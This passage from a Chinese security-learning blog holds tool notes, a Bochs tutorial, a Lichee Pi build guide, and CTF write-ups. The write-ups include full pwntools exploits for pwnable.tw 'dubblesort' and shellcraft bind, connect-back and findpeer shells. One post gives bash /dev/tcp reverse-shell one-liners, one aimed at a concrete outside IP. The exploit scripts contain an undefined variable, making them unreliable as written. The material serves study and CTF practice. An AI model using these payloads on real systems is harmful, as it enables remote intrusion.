使用说明教程（图文）](https://www.xp.cn/wenda/376.html)\n\n2、大致了解了一下php的语法\n\n3、什么是apache，apache与php之间的关系\n\n[apache是什么](https://blog.csdn.net/mazhaer/article/details/52966568)\n\n[apache是什么？他和Django有什么关系？](https://blog.csdn.net/weixin_38172774/article/details/104773354)\n\n4、什么是数据库以及MySQL\n\n[MySQL是什么？](https://www.yiibai.com/mysql/what-is-mysql.html)\n\n\n\n\n\n# burpsuit 收发包\n\n- 基本使用，收，发，打断点，改\n\n1、参考文章——[burpsuite实战指南](https://t0data.gitbooks.io/burpsuite/content/)，看最前面几个小节，大概了解一下burpsuite常用的几个功能。\n\n2、burpsuite拦截https报文之前，需要先设置一下证书，具体操作参考[Burp Suite抓HTTPS数据包（通用）](https://blog.csdn.net/zyw_anquan/article/details/47904495)\n\n\n\n\n\n# wireshark 看流量\n\n\n\n\n\n\n\n# 后门工具\n\n菜刀，蚁剑，冰蝎，哥斯拉\n\n- 会用\n\n1、中国菜刀\n\n分Windows平台和Linux平台的菜刀。\n\n\n\n## 蚁剑\n\n安装过程中出了点问题，参考这篇文章解决——[中国蚁剑安装步骤（win10 64） 报错：解压代码出错：[object Object]](https://blog.csdn.net/Ahuuua/article/details/109034528)\n\n\n\n# 目录扫描\n\n御剑，\n\n- 会用\n\n\n\n\n\n# others\n\n## phpmyadmin\n\n几种getshell的方式：https://www.cnblogs.com/muxueblog/p/13043768.html\n\n## hackbar\n\n好用的debian系统包管理工具——aptitude\n\n```\nsudo apt-get install aptitude\n```\n\n\n\n## meterpreter\n\nmeterpreter中执行shell，可以获取shell行\n\n[meterpreter进shell后乱码问题的解决方案](https://my.oschina.net/u/4587410/blog/4688382)\n","tags":["网络渗透"],"categories":["基础技能"]},{"title":"bochs usage","url":"/2021/08/08/bochs-usage/","content":"\n\n\n# 安装bochs\n\nbochs是一个模拟器，ubuntu下安装apt过程如下：\n\n```shell\nsudo apt install bochs\nsudo apt install bochs-sdl\t\t#下面几个插件也安装上，否则bochs可能无法启动\nsudo apt install bochs-term\nsudo apt install bochs-wx\nsudo apt install bochs-x\nsudo apt install bochsbios\n```\n\n另外，也可以通过下载[bochs源码](https://github.com/lubomyr/bochs)自行编译。\n\n# 使用bochs\n\n这里以创建一个引导文件，并启动bochs为例。\n\n1. 创建一个汇编文件，并使用nasm编译该文件生成boot.bin\n\n   - 创建一个boot.asm文件，输入一下内容，参考自[bochs使用教程[Linux篇]](https://www.jianshu.com/p/742a61ce3e58)\n\n   ```assembly\n   org 07c00h ; 告诉编译器程序加载到 7c00处   \n       mov ax, cs   \n       mov ds, ax   \n       mov es, ax                       \n       call DispStr ; 调用显示字符串例程   \n       jmp $ ; 无限循环   \n   DispStr:   \n       mov ax, BootMessage   \n       mov bp, ax ; es:bp = 串地址   \n       mov cx, 16 ; cx = 串长度   \n       mov ax, 01301h ; ah = 13, al = 01h   \n       mov bx, 000ch ; 页号为 0(bh = 0) 黑底红字(bl = 0Ch,高亮)   \n       mov dl, 0   \n       int 10h ; 10h 号中断   \n       ret   \n   BootMessage:   \n       db \"Hello, OS world!\"   \n       times 510-($-$$) db 0 ; 填充剩下的空间，使生成的二进制代码恰好为   \n       dw 0xaa55 ; 结束标志\n   ```\n\n   - 使用`nasm boot.asm -o boot.bin`将以上汇编代码编译成二进制文件\n\n2. 创建一个映像软盘，并将boot.bin写入软盘中\n\n   - 使用bximage创建软盘，参考自[实现操作系统之环境搭建](http://www.360doc.com/content/15/0331/11/12129652_459507015.shtml)\n\n   ```shell\n   $ bximage\n   ========================================================================\n                                   bximage\n                     Disk Image Creation Tool for Bochs\n             $Id: bximage.c 11315 2012-08-05 18:13:38Z vruppert $\n   ========================================================================\n   \n   Do you want to create a floppy disk image or a hard disk image?\n   Please type hd or fd. [hd] fd\n   \n   Choose the size of floppy disk image to create, in megabytes.\n   Please type 0.16, 0.18, 0.32, 0.36, 0.72, 1.2, 1.44, 1.68, 1.72, or 2.88.\n    [1.44] \n   I will create a floppy image with\n     cyl=80\n     heads=2\n     sectors per track=18\n     total sectors=2880\n     total bytes=1474560\n   \n   What should I name the image?\n   [a.img] \n   \n   Writing: [] Done.\n   \n   I wrote 1474560 bytes to a.img.\n   \n   The following line should appear in your bochsrc:\n     floppya: image=\"a.img\", status=inserted\n   $ ls\n   a.img\n   ```\n\n   - 将第一步生成的boot.bin写入软盘映像a.img中\n\n   ```\n   dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc\n   ```\n\n3. 创建bochs的配置文件\n\n   - 创建一个配置文件bochs.rc参考[Bochs简易教程](http://www.edu2act.cn/article/bochsjian-yi-jiao-cheng/)\n\n   ```shell\n   megs:32 \t\t# 指定虚拟系统会被分配的内存大小32MB\n   romimage:flie=/usr/share/bochs/BIOS-bochs-latest \t\t#设置加载路径对应真实机器的BIOS \n   vgaromimage:file=/usr/share/bochs/VGABIOS-lgpl-latest \t\t#设置加载路径对应真实机器的VGABIOS\n   floppya:1_44=a.img,status=inserted \t\t# floppya是第一软驱，floppyb是第二软驱。后面标明的是软驱镜像文件的位置(boot.img是自己写的引导加载程序)，软盘是否插入\n   boot: a \t\t# 选择所启动的盘符类型 \n   ```\n\n4. 使用配置文件启动bochs\n\n   - 启动bochs的命令如下\n\n   ```shell\n   bochs -f bochs.rc\n   c\t\t# 执行c之前，可以下断点，然后调试启动过程\n   ```\n\n# 练习bochs题目\n\n这一小节待整理\n\n- 0x7c00\n\n\n\n- square ctf 2017 - floppy\n\nhttps://github.com/oh-iowned/ctf-writeups/blob/master/2017/square-ctf/floppy/README.md\n\nhttp://www.actforit.com/wp/reverse/square-ctf-2017-floppy-web-1000-pts/\n\n\n\n- flare on ctf 2018 （侧重逆向）\n\nhttps://blog.attify.com/flare-on-5-writeup-part9/\n\nhttps://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn5_Challenge12_Solution.pdf\n\nhttps://emanuelecozzi.net/posts/ctf/flareon-2018-challenge-12-cat-grep-writeup/\n\nhttps://www.fireeye.com/blog/threat-research/2018/10/2018-flare-on-challenge-solutions.html\n\n\n\n\n\n\n\n\n\n","tags":["bochs"],"categories":["CTF"]},{"title":"pwnable.tw 之 dubblesort","url":"/2021/05/15/pwnable-tw-dubblesort/","content":"\n题目文件如下：\n\n[dubblesort](https://pwnable.tw/static/chall/dubblesort)\n\n[libc.so](https://pwnable.tw/static/libc/libc_32.so.6)\n\n# 分析过程\n\n首先查看二进制基本信息：\n\n```shell\n$ file dubblesort \ndubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped\n\n$ checksec dubblesort\n[*] '/home/bling/pwnable_tw/dubblesort/dubblesort'\n    Arch:     i386-32-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n```\n\nIDA分析伪代码流程，如下代码中将几个漏洞点标记出来了。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  unsigned int v3; // eax\n  _BYTE *v4; // edi\n  unsigned int i; // esi\n  unsigned int j; // esi\n  int result; // eax\n  unsigned int v8; // [esp+18h] [ebp-74h] BYREF\n  _BYTE v9[32]; // [esp+1Ch] [ebp-70h] BYREF\n  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF\n  unsigned int v11; // [esp+7Ch] [ebp-10h]\n\n  v11 = __readgsdword(0x14u);\n  sub_8B5();\n  __printf_chk(1, \"What your name :\");\n  read(0, buf, 0x40u);\n  __printf_chk(1, \"Hello %s,How many numbers do you what to sort :\");\t\t//read函数不会在输入结尾置\"\\x00\"，导致使用\"%s\"格式化输出时越界打印，造成信息泄露\n  __isoc99_scanf(\"%u\", &v8);\n  v3 = v8;\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\t\t//未限制v8的大小，导致循环中对地址v4的写入过程产生栈溢出\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\t\t\t// scanf函数在格式化字符类型与实际类型不匹配时，不会往栈上写入内容，直接进入下一步\n      v3 = v8;\n      v4 += 4;\n    }\n  }\n  sub_931(v9, v3);\t\t\t//这里就是一个排序函数，利用的时候要考虑输入数据大小的不同，会导致最后在栈上存储顺序不同\n  puts(\"Result :\");\n  if ( v8 )\n  {\n    for ( j = 0; j < v8; ++j )\n      __printf_chk(1, \"%u \");\n  }\n  result = 0;\n  if ( __readgsdword(0x14u) != v11 )\n    sub_BA0();\n  return result;\n}\n```\n\n\n\n## 通过read函数泄露信息\n\n> read函数接收输入后（把'\\n'也当作一个字符），并不会在末尾添加\"\\x00\"。那么如果后续以\"%s\"对该输入进行输出操作，就会越界打印，造成信息泄露。\n\n随便输入几个字母，可以看到打印出了乱码。多打印出来的字符来自于栈上，栈上可能存有libc的地址，因此考虑用这个漏洞泄露libc基址。\n\n![](image-20210515183536310.png)\n\n下图展示了本地栈空间内容，输入的是‘aaaa’（对应0xffffce4c处的0x61616161），可以看到0x61616161后的栈空间内有很多f7开头的、长得很像地址的值。对应到vmmap获取的进程空间，目标集中在了“0xf7fb2000”这个值。输入的第六和第七个单元都是它，经过实践，本地泄露第六个单元能成功，远程泄露第七个单元才能成功。\n\n另外还有一个需要注意的点，本地调试中0xf7fb2000对应libc的got.plt段，其加载偏移通过`readelf -S /lib/i386-linux-gnu/libc-2.27.so`得到是0x1d8000，因此本地利用时libc基址为`0xf7fb2000 - 0x1d8000`。\n\n而远端libc跟本地不一样，其got.plt段加载偏移通过`readelf -S libc_32.so.6`得到是0x1b0000。因此在打远程的时候，需要用`泄露地址 - 0x1b0000`来得到lbic基址。\n\n![](image-20210515121957899.png)\n\n## 未限制numbers大小导致栈溢出\n\n源码中V8是用户输入的数据，未做限制便作为for循环的条件，导致可以往栈上写任意长度的数据。\n\n```c\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\n      v3 = v8;\n      v4 += 4;\n    }\n  }\n```\n\n## 通过scanf函数绕过canary\n\n> scanf函数在格式字符类型和输入字符类型不匹配时，不会将内容写入栈上，也不会报错，而是继续执行。\n\n本题中利用scanf的这个特性，可以绕过canary的限制。\n\nscanf(\"%u\",v4)：\n\n- 当输入的v4为字母时，会被定义为非法字符，虽然不会往栈上写数据，但这个字母会一直存在于输入缓冲区，导致一直无法输入。\n- 而当输入为'+' '-'这两个字符时，由于他们可以定义数字的正负，因此不会被定义为非法字符。同时单独输入该字符又能达到不往栈上写入数据的目的。\n\n```\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\n      v3 = v8;\n      v4 += 4;\n    }\n  }\n```\n\n![](image-20210515190651246.png)\n\n\n\n# EXP\n\n## 本地\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nmyelf = ELF(\"./dubblesort\")\npr = process(myelf.path)\n\n# leak libc base\npr.recvuntil(\"What your name :\")\npr.sendline(\"aaaabbbbccccddddeeee\")\npr.recvuntil(\"eeee\\n\")\nlibc = pr.recvuntil(\",\")[:3].ljust(4,\"\\x00\")\nlibc = u32(test1)<<8\nlog.warn(\"leak libc : 0x%x\" % test1)\n\nlibc_base_remote = libc - 0x1b0000\nlog.warn(\"libc base: 0x%x\" % libc_base_remote)\nsys_remote = libc_base_remote + 0x3A940\nbinsh_remote = libc_base_remote + 0x158E8B\n\n# gadget_addr = libc_base_local + 0x67bdf    # fail\n\n# stack overflow\npr.recvuntil(\"do you what to sort :\")\npr.sendline(str(35))\n# gdb.attach(pr,'b fflush \\n c')\nfor i in range(24):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(i))\n\npr.recvuntil(\"number : \")\npr.sendline('+')\n\nfor j in range(7):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(0xeeeeeee0+j))\n\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote))\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote+0x10))\npr.recvuntil(\"number : \")\npr.sendline(str(binsh_remote))\n\npr.interactive()\n```\n\n\n\n## 远程\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\npr = remote('chall.pwnable.tw',10101)\n\n# leak libc base\npr.recvuntil(\"What your name :\")\npr.sendline(\"aaaabbbbccccddddeeeeffff\")\npr.recvuntil(\"ffff\\n\")\nlibc = pr.recvuntil(\",\")[:3].ljust(4,\"\\x00\")\nlibc = u32(test1)<<8\nlog.warn(\"leak libc : 0x%x\" % test1)\n\nlibc_base_remote = libc - 0x1b0000\nlog.warn(\"libc base: 0x%x\" % libc_base_remote)\nsys_remote = libc_base_remote + 0x3A940\nbinsh_remote = libc_base_remote + 0x158E8B\n\n# stack overflow\npr.recvuntil(\"do you what to sort :\")\npr.sendline(str(35))\n\n# 构造0->23,canary,0xeeeeeee0,~1,~2,~3,~4,~5,~6,sys_addr,sys_addr+0x10,binsh_addr\n# 排序后，依然是以上顺序，\nfor i in range(24):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(i))\n\npr.recvuntil(\"number : \")\npr.sendline('+')\t\t# 在canary处不写入\n\nfor j in range(7):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(0xeeeeeee0+j))\n\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote))\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote+0x10))\npr.recvuntil(\"number : \")\npr.sendline(str(binsh_remote))\n\npr.interactive()\n```\n\n\n\n\n\n# 参考\n\n[pwnable.tw刷题之dubblesort](https://www.freebuf.com/articles/others-articles/134271.html)","tags":["read func","scanf func"],"categories":["CTF"]},{"title":"深入理解 pwn 题中的正连/反连 tcp","url":"/2021/03/21/reverse-tcp/","content":"\n# 编译漏洞源码\n\n以下源码来自[老板娘](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/) 。通过了解socket编程[一文让你透彻理解Linux的SOCKET编程（含实例解析）](https://zhuanlan.zhihu.com/p/180556309)，很明显可以看出，该服务器程序有个栈溢出漏洞。\n\n```c\n#include<stdio.h>\n#include<unistd.h>\n#include<sys/socket.h>\n#include<arpa/inet.h>\n\nint main(int argc,char **argv){\n    int jmp = 0xe4ff;\n    int sckfd,fd;\n    char buf[10];\n    struct sockaddr_in server;\n    sckfd = socket(AF_INET,SOCK_STREAM,0);\n    server.sin_family = AF_INET;\n    server.sin_port = htons(8888);\n    server.sin_addr.s_addr = inet_addr(\"0.0.0.0\");\n    bind(sckfd,(struct sockaddr *)&server,sizeof(server));\n    listen(sckfd,10);\n    fd = accept(sckfd,NULL,NULL);\n    read(fd,buf,1000);\n\n    return 0;\n}\n```\n\n编译命令：\n\n```bash\ngcc server1.c -fno-stack-protector -no-pie -z execstack -o server1\n```\n\n# 五种getshell的方式\n\n我们通过pwntools提供的shellcraft来完成本题的利用。（通过该方式生成的shellcode中含\"\\x00\"，在真实世界的利用中如遇到strcpy这种函数，将利用不成功）\n\n## sh()\n\nexp如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.sh())\n\npr.sendline(payload)\npr.interactive()\n```\n\n攻击后，server1进程和攻击者进程的连接情况，及/proc/self/fd下的指向如下图所示：\n\n![](sh.png)\n\n可以看到，server1进程(PID:18662)，其fd的0 1 2 都是指向\"/dev/pts/1\"，表明标准输入、输出、错误都是打印到当前terminal或者从当前terminal获取的。\n\n此时我们在python起的terminal中是无法拿到server1进程起的shell的，除非我们在执行execve(\"/bin/sh\")之前将0 1 2 替换成socket连接，将输入输出定向到socket。这是接下来几种方法要讲的。\n\n## bindsh() - 正连\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.bindsh(4444,'ipv4')) \n\npr.sendline(payload)\n\nff = remote('127.0.0.1',4444)   \nff.interactive()\n```\n\nexp执行后的情况如下：\n\n![](bindsh.png)\n\n这个方法是在server1中通过socket()-->bind()-->listen()-->accept()创建一个新的socket监听端口，然后把server1的fd中 0 1 2全部指向新socket。这样接下来执行execve()后，输入输出就全定向到新socket流中。攻击进程主动向受害者进程的4444端口发起连接，就可以拿到受害者的输入输出，从而获得shell。\n\n## dupsh()\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.dupsh(4))\n\npr.sendline(payload)\npr.interactive()\n```\n\n这种方法复用了攻击进程与server1建立的socket连接，本题中对于server1进程来说正好是fd=4。\n\n![](dupsh.png)\n\n## connect()+dupsh() - 反连\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.connect('127.0.0.1',4444,'ipv4')+shellcraft.dupsh())   \n\npr.sendline(payload)\npr.interactive()\n```\n\n在执行攻击代码前，需要先开一个terminal，用nc监听4444端口，等待server1的连接：\n\n```bash\nnc -l -p 4444\n```\n\n本方法是利用server1主动去connect我们监听的端口，建立socket连接，并用这个socket去覆盖原本的 0 1 2，达到将输出定向到远端的目的。\n\n![](connect.png)\n\n## findpeersh()\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.findpeersh(pr.lport))\n\npr.sendline(payload)\npr.interactive()\n```\n\n本方法是在server1进程中寻找与`pr.lport`端口有连接的socket，并覆盖原来fd的0 1 2。攻击进程中成功拿到shell时的连接情况如下：\n\n![](findpeersh.png)\n\n\n# bash的/dev/tcp/ip/port反弹shell\n\npwn题中，反弹shell可以使用bash的/dev/tcp/ip/port特性创建socket连接，代码如下\n\n```bash\nbash -i &> /dev/tcp/ip/port 0>&1\nbash -i &> /dev/tcp/ip/port 0>&2\n# 如果使用system执行以上命令的话，需要改成如下形式\nbash -c \"bash -i &> /dev/tcp/ip/port 0>&1\"\nbash -c \"bash -i &> /dev/tcp/ip/port 0>&2\"\n```\n\n将以上命令分开理解：\n\n`bash -i` ：创建一个交互式shell\n\n`&>` ：将stdout和stderr都重定向到stdout。`>&`跟它的功能一样，当使用`>& file`或`&> file`时，等同于`> file 2>&1`\n\n`/dev/tcp/ip/port` ：利用bash的特性，创建一个socket连接\n\n`0>&1` ：将stdin重定向给stdout\n\n`0>&2` ：将stdin重定向给stderr\n\n`bash -c \"command\"` ：创建一个子shell环境运行command\n\n根据重定向符号的特性，以下命令也可以。前面部分将stdout重定向给socket连接，最后将stdin和stderr都重定向给stdout即socket\n\n```bash\nbash -i 1> /dev/tcp/45.32.206.182/17242 0>&1 2>&1\n# \">\"默认为标准输出重定向，同 \"1>\"\nbash -i > /dev/tcp/45.32.206.182/17242 0>&1 2>&1\n```\n\n\n# metasploit的msfvenom与反弹shell\n\n[msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) ：用来生成木马软件（pwn利用中常用来生成一个反弹shell的软件）\n\n[msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole/) 的exploit/multi/handler：MSF中的侦听模块\n\n在[TOTOLINK T10旧版本漏洞挖掘和分析](https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/#%E5%8F%8D%E8%BF%9Eshell) 这篇文章中，写了两个使用示例——生成后门软件和生成shellcode，它们可被用于不同的场景下。\n\n\n# 参考文档\n\n[多种姿势反弹shell](https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/)\n\n[Linux ：输入/输出重定向 >, 1>, 2>, &>, >> , <<](https://gwaslab.com/2021/11/28/linux-redirection/)\n\n[利用msfvenom生成木马](https://pingmaoer.github.io/2020/03/06/%E5%88%A9%E7%94%A8msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/)\n\n","categories":["CTF"]},{"title":"荔枝派zero镜像制作及烧录","url":"/2021/03/07/lichee-start/","content":"\n# 环境准备\n\n关于荔枝派zero是什么，可以通过以下链接去了解。\n\n- [荔枝派Zero用户指南](https://licheezero.readthedocs.io/zh/latest/)\n- [荔枝派直播公开课_荔枝派是怎样炼成的](https://www.bilibili.com/video/BV14s41167f3?from=search&seid=9356216417140987538)\n- [哇酷开发者社区 - 全志V3s讨论区](https://whycan.com/f_17.html)\n\n这篇文章主要记录第一次在荔枝派zero上烧写镜像的过程。下面列出的是本次做实验需要用到的硬件和工具：\n\n1. 淘宝[Sipeed官方店](https://item.taobao.com/item.htm?spm=a1z0d.7625083.1998302264.6.5c5f4e69qdcGhV&id=585033586770)购买lichee pi zero板子的全套餐。（买全套餐的原因是，怕万一后续缺某个组件会很麻烦，干脆一次买好）\n2. SD卡。（我用的16G的）\n3. 读卡器。（将镜像写入SD卡中）\n4. usb转串口工具。（[这种类型的](https://detail.tmall.com/item.htm?id=529606571756&spm=a1z09.2.0.0.25f12e8dI4Uhck&_u=7vh1ssgab1b)）\n5. 公对母杜邦线。\n6. 还有其他做硬件必不可少的工具，如万用表、电烙铁焊接套餐、各种公母杜邦线等等。（虽然这次试验没有都用上，但如果决定学习底层硬件原理的话，是需要都准备上的）\n\n下面进入正题。\n\n首先，使用别人制作好的镜像烧入sd卡中，来测试板子是否能正常使用。\n\n之后，尝试自己编译uboot、linux kernel、文件系统，并将其写入到sd中，用于启动zero。\n\n# 使用完整镜像测试\n\n这一节参考了[荔枝派 zero(全志V3S)-编译及SD烧录](https://blog.csdn.net/u012577474/article/details/103494044)这篇文章的第一小节。\n\n主要步骤如下\n\n## 烧录sd卡\n\n1. 将[镜像](brmin_dd.tar.bz2)下载到本地，解压后可以看到`lichee_zero-brmin_alpha.dd`这个文件。\n\n2. 使用[SD Card Formatter](https://www.sdcard.org/downloads/formatter/)将sd卡格式化。\n\n3. 使用[Win32 Disk Imager](https://sourceforge.net/projects/win32diskimager/)将上述解压得到的dd文件烧入sd卡中。\n\n## 启动zero\n\n1. 将上述烧好的SD卡插入zero的sd卡插槽中。\n\n2. 将显示屏通过FPC 40连接到zero上，用于查看启动时的输出。\n\n3. 使用usb otg给zero供电。这时就可以看到屏幕中打印启动log了。\n\n以上，证明我们的板子和操作是木有问题的，下面就让我们从源码开始构建一个zero的镜像吧！\n\n# 源码编译构建镜像\n\n这节内容参考了[荔枝派官方文档](https://licheezero.readthedocs.io/zh/latest/%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91/uboot_index.html)及以下三篇文章，写的都非常棒！\n\n- [荔枝派Zero | 全志V3s 开发教程（一）](https://blog.csdn.net/qq_40860568/article/details/96474001)\n- [荔枝派Zero V3s开发板入坑记录 (TF/SD卡启动)(主线Linux,主线u-boot)](https://whycan.com/t_561.html)\n- [荔枝派 zero(全志V3S)-编译及SD烧录](https://blog.csdn.net/Jun626/article/details/90082000)\n\n## 编译uboot\n\n安装依赖\n\n```shell\nsudo apt install gcc-6-arm-linux-gnueabihf\nsudo apt-get install device-tree-compiler\n```\n\n为了适配Makefile，将以上安装的arm-linux-gnueabihf-gcc-6创建一个软链接\n\n```shell\ncd /usr/bin\nsudo ln -s ./arm-linux-gnueabihf-cpp-6 ./arm-linux-gnueabihf-cpp\nsudo ln -s ./arm-linux-gnueabihf-gcc-ar-6 ./arm-linux-gnueabihf-gcc-ar\nsudo ln -s ./arm-linux-gnueabihf-gcc-nm-6 ./arm-linux-gnueabihf-gcc-nm\nsudo ln -s ./arm-linux-gnueabihf-gcc-ranlib-6 ./arm-linux-gnueabihf-gcc-ranlib\nsudo ln -s ./arm-linux-gnueabihf-gcov-6 ./arm-linux-gnueabihf-gcov\nsudo ln -s ./arm-linux-gnueabihf-gcov-dump-6 ./arm-linux-gnueabihf-gcov-dump\nsudo ln -s ./arm-linux-gnueabihf-gcov-tool-6 ./arm-linux-gnueabihf-gcov-tool\n```\n\n下载uboot源码并修改配置文件sun8i.h\n\n```shell\ngit clone https://github.com/Lichee-Pi/u-boot.git -b v3s-current\ncd u-boot\n# 修改include/configs/sun8i.h，使u-boot可以从tf卡启动。添加以下内容：\n#define CONFIG_BOOTCOMMAND   \"setenv bootm_boot_mode sec; \" \\\n                            \"load mmc 0:1 0x41000000 zImage; \"  \\\n                            \"load mmc 0:1 0x41800000 sun8i-v3s-licheepi-zero-dock.dtb; \" \\\n                            \"bootz 0x41000000 - 0x41800000;\"\n\n#define CONFIG_BOOTARGS      \"console=ttyS0,115200 panic=5 rootwait root=/dev/mmcblk0p2 earlyprintk rw  vt.global_cursor_default=0\"\n```\n\n改完sun8i.h后，执行编译\n\n```shell\nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- LicheePi_Zero_800x480LCD_defconfig\nmake ARCH=arm menuconfig\ntime make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- 2>&1 | tee build.log\n```\n\n编译完成后，将在当前目录下生成u-boot-sunxi-with-spl.bin。这个二进制文件将被烧到8k位置用于启动。\n\n## 编译linux kernel\n\n下载linux源码并编译\n\n```shell\ngit clone https://github.com/Lichee-Pi/linux.git\ncd linux\nmake ARCH=arm licheepi_zero_defconfig\nmake ARCH=arm menuconfig \nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- -j4     # 编译内核，目标文件为./arch/arm/boot/zImage\nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- dtbs    # 编译设备树，目标文件为./arch/arm/boot/dts/sun8i-v3s-licheepi-zero-dock.dtb\n```\n\n## 编译文件系统\n\n安装依赖\n\n```shell\nsudo apt-get install linux-headers-$(uname -r)\n```\n\n下载源码并编译\n\n```shell\nwget https://buildroot.org/downloads/buildroot-2017.08.tar.gz\ntar xvf buildroot-2017.08.tar.gz\ncd buildroot-2017.08/\nmake menuconfig\t\t\t# 这里，在menuconfig中需要配置一些参数,如下\n## *******第一部分配置******** ##\n# Target Architecture (ARM(little endian)) --->\n# Target Binary Format (ELF) --->\n# Target Architecture Variant (cortex-A7) --->\n# Target ABI (EABIhf) --->\n# Floating point strategy (VFPv4) --->\n# ARM instruction set (ARM)  --->\n## *******第二部分配置******** ##\n#     Toolchain type (External toolchain) --->\n#     *** Toolchain External Options ***\n#     Toolchain (Linaro ARM 2017.02)\n#     Toolchain origin (Toolchain to be downloaded and installed) --->\n# [ ] Copy gdb server to Target\n#     *** Host GDB Options ***\n# [ ] Build cross gdb for the host\n# [ ] *** Toolchain Generic Options ***\n# [ ] Copy gconv libraries\n# [*] Enable MMU support\n# ( ) Target Optimizations\n# ( ) Target linker options\n# [ ] Register toolchain within Eclipse Buildroot plug-in\n## *******配置结束******** ##\nmake       # 完成后会生成./output/images/rootfs.tar，这就是我们需要的根文件系统\n```\n\n## 烧录SD卡\n\n将以上三步生成的四个文件拷贝到一块，便于进行后续步骤\n\n```shell\nbling@Ubuntu1804:~/lichee/sdcard$ ll\ntotal 9612\ndrwxr-xr-x 2 bling bling    4096 3月   7 15:46 ./\ndrwxr-xr-x 6 bling bling    4096 3月   6 22:41 ../\n-rw-r--r-- 1 bling bling 5601280 3月   6 22:41 rootfs.tar\n-rw-r--r-- 1 bling bling    9262 3月   6 22:41 sun8i-v3s-licheepi-zero-dock.dtb\n-rw-r--r-- 1 bling bling  398407 3月   6 22:42 u-boot-sunxi-with-spl.bin\n-rwxr-xr-x 1 bling bling 3813392 3月   6 22:42 zImage*\n```\n\n将SD卡接入Ubuntu中，在Ubuntu中打开GParted分区编辑器\n\n- 在GParted界面的右上角可以切换磁盘设备，我的SD卡对应的是/dev/sdb。\n\n- 删除SD卡上的所有分区，使之成为一个未分配的磁盘。（记得点击上方绿色的“勾”，使更改生效）\n\n- 然后，创建第一个分区，为FAT16格式\n\n  ![](partition-fat16.png)\n\n- 再，创建第二个分区，为EXT4格式\n\n  ![](partition-ext4.png)\n\n- 最后，记得点击上方绿色的“勾”，使更改生效！！然后拔掉读卡器，再重新插到电脑上，就可以看到fat16和ext4分别挂载到了/media/bling/目录下\n\n  ![](partition-finish.png)\n\n分区完成后，就可以将uboot，内核文件，dts文件以及根文件系统写入SD卡了！\n\n```shell\n# 1.使用dd命令将uboot镜像写到8k位置处\nsudo dd if=u-boot-sunxi-with-spl.bin of=/dev/sdb bs=1024 seek=8\n# 确认uboot bin文件是否写去入磁盘中，这条可不执行\n# sudo dd bs=1024 count=2000 if=/dev/sdb of=./test1.bin  \n\n# 2.将dtb和zImage拷贝进fat16分区\ncp sun8i-v3s-licheepi-zero-dock.dtb /media/bling/BOOT/\ncp zImage /media/bling/BOOT/\n\n# 3.将文件系统rootfs.tar文件解压并拷贝进ext4的分区\nsudo tar xvf rootfs.tar -C /media/bling/rootfs/\n```\n\n这样就完成SD卡的制作了。\n\n## 查看串口输出\n\n让我们试试这些镜像能不能正常运行吧！\n\n还需要做几件事情：\n\n1. 将上述烧好的SD卡插入zero的sd卡插槽中。\n\n2. 在电脑上查看串口输出：需要将荔枝派的UART0 的 TX 和 RX 分别连接到“usb转ttl工具”的 RX 和 